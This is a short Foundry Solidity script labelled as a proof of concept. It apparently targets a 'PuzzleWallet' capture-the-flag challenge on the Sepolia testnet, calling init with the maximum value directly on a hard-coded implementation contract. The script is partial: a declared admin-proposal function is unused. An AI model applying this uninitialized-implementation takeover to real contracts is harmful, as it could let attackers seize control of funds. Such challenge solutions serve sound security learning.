pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface PuzzleWallet{
    function whitelisted(address addr) external view returns (bool);
    function proposeNewAdmin(address _newAdmin) external;
    function init(uint256 _maxBalance)external;
}


contract POC is Script {
    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function run() external{
        vm.startBroadcast();

        PuzzleWallet wallet = PuzzleWallet(0x086032F3A5D2D6a57a9eB81050Beb6f07f03D5F9);

        // address(wallet).call(abi.encodeWithSignature("callme()"));
        address impl = 0x7A95ccb0c54415594886a70Aec524B2F31dCF2C3;
        PuzzleWallet(impl).init(type(uint).max);



        vm.stopBroadcast();
    }
}
